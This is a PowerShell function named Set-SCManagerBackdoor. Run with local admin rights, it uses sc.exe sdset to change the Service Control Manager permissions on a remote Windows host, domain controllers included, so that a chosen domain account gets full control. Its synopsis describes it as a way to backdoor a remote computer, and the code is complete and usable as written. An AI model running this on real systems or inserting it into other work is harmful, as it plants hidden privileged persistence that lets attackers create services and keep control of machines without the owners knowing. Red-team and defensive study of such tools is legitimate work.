function Set-SCManagerBackdoor() {
<#
.SYNOPSIS
Sets permissions on SCManager on remote computers so users can create a service. Can be used to Backdooring a remote computer.
.DESCRIPTION
The Set-SCManagerBackdoor function uses sc.exe on the remote machine to set permissions on SCManager.
Computer names or IP addresses are expected as pipeline input, or may be passed to the –RemoteComputer parameter. 
.PARAMETER Username
The username that will be granted access. Must be in the format "domain\username"
.EXAMPLE
Set-SCManagerBackdoor -Username "domain\monitoring" -RemoteComputer "domaincontroller.domain.com"
.NOTES
You need to run this function as a user that has local administrator on the target computer.
	Author : Shantanu Khandelwal 
	Twitter : @shantanukhande
	Email : shantanukhandelwal@protonmail.com
#>
Param(
	[Parameter(Mandatory=$True)]
	[string]$Username,
  [Parameter(Mandatory=$True)]
	[string]$RemoteComputer
)
$domain = ($username.split("\"))[0]
$user = ($username.split("\"))[1]
$ntaccount = New-Object System.Security.Principal.NTAccount($domain,$user)
$sid = ($ntaccount.Translate([System.Security.Principal.SecurityIdentifier])).value
if (!$sid) {
	return "[-] User $username cannot be resolved to a SID. Does the account exist?"
	exit
}
$sddl = & $env:SystemRoot\System32\sc.exe \\$RemoteComputer sdshow scmanager
if ($sddl -like "*$sid*"){
Write-Output "[-] May be $Username already have SCManager access on $RemoteComputer"
Write-Output "[-] Remote Comuter replied with $sddl access mask."
}
$access_mask = "(A;;0xF003F;;;IU)"
$access_mask = $access_mask.Replace("IU",$sid)
$separator = "S:"
$sddl_break = $sddl -split $separator, 0, "simplematch"
if ($sddl_break.Count -eq 3){
    $finalsddl = $sddl_break[1]+$access_mask+"S:"+$sddl_break[2]
    $sddlset = & $env:SystemRoot\System32\sc.exe \\$RemoteComputer sdset scmanager $finalsddl
    if ($sddlset -notlike "*SUCCESS*") {
	return "[-] Permissions did not set"
    }
    else{
    $sddl = & $env:SystemRoot\System32\sc.exe \\$RemoteComputer sdshow scmanager
    if ($sddl -like "*$sid*"){
        Write-Host "[+] Permissions Set"
      }
    }

  }

}
